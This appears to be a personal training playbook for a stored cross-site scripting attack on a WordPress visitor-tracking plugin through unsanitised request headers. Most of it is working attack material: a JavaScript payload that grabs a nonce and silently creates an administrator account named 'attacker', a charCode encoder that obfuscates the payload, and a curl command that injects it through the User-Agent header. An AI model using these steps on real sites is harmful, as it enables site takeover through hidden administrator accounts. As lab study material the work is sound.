Stored XSS Against WP Playbook:

1. Identify user controlled input that is sent to a DB and later rendered. eg. In the 0.3 version of the Visitors WP plugin X-Forwarded-For & User-Agent headers sent by the client are stored without sanitisation, and later rendered in the browser in a particular admin console. Therefore when any admin visits that page from then on the code we embed in some script tags is executed.
2. Get Burp up and running, make sure intercept is off and the proxy is correctly configured. Look in the proxy section for requests made in the browser. Send one to the repeater (Ctrl+R), in the repeater edit the contents of the User-Agent header to include a reverse shell, alternatively you could do something really whacky:
	
Take this whacko payload:
```js
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";
var nonceRegex = /ser" value="([^"]*?)"/g;
ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];
var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajaxRequest.send(params);
```
Pop it into jscompress.com to compress it, then feed it to the following function in the console to minify it:
```js
function encode_to_javascript(string) {
    var input = string
    var output = '';
    for(pos = 0; pos < input.length; pos++) {
        output += input.charCodeAt(pos);
        if(pos != (input.length - 1)) {
            output += ",";
        }
    }
    return output;
}
let encoded = encode_to_javascript('insert_minified_javascript')
console.log(encoded)
```
Finally pass the following to your vulnerable parameter:
`curl -i http://offsecwp --user-agent "<script>eval(String.fromCharCode(<insert encoded payload here>))</script>" --proxy 127.0.0.1:8080`

Make sure intercept is on in Burp, have a look at the payload, then send it on.
Visiting the Visitor Plugin dashboard will trigger the stored XSS payload.